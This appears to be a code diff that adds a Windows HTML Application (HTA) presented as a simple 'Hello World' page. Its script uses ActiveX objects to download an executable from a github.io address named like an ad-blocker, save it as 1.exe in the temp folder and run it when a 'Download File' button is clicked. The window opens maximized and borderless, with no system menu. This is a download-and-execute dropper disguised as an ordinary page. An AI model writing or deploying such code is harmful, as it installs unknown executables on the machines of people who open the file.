@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Full Screen HTA</title>
+<HTA:APPLICATION ID="FullScreenHTA"
+  APPLICATIONNAME="Full Screen HTA"
+  BORDER="none"
+  INNERBORDER="no"
+  MAXIMIZEBUTTON="no"
+  MINIMIZEBUTTON="no"
+  SCROLL="no"
+  SHOWINTASKBAR="yes"
+  SINGLEINSTANCE="yes"
+  SYSMENU="no"
+  WINDOWSTATE="maximize"
+/>
+
+
+</head>
+<body>
+<script>
+function openUrlInDefaultBrowser(url) {
+  var shell = new ActiveXObject("Shell.Application");
+  shell.ShellExecute(url);
+}
+function runExeFile(path) {
+  var shell = new ActiveXObject("WScript.Shell");
+  shell.Run(path);
+}
+function downloadFile(url, filename) {
+  var fso = new ActiveXObject("Scripting.FileSystemObject");
+  var tempFolder = fso.GetSpecialFolder(2);
+  var xmlhttp = new ActiveXObject("MSXML2.XMLHTTP");
+  xmlhttp.open("GET", url, true);
+ // xmlhttp.responseType = "arraybuffer";
+  xmlhttp.onreadystatechange = function() {
+    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+      var stream = new ActiveXObject("ADODB.Stream");
+      stream.type = 1;
+      stream.open();
+      stream.write(xmlhttp.responseBody);
+      stream.saveToFile(tempFolder+"\\1.exe", 2);
+      stream.close();
+      runExeFile(tempFolder+"\\1.exe");
+    }
+  };
+  xmlhttp.send();
+}
+</script>
+
+<div>
+  <h1>Hello World!</h1>
+  <p>This is my HTML content.</p>
+  <script type="text/javascript">
+
+  </script>
+  <button onclick="downloadFile('https://total-adblock.github.io/OpenUrl.exe', ' ')">Download File</button>
+
+</div>
+<script>
+//window.showModelessDialog("about:blank", window, "dialogWidth: 100%; dialogHeight: 100%; resizable: no;");
+</script>
+</body>
+</html>
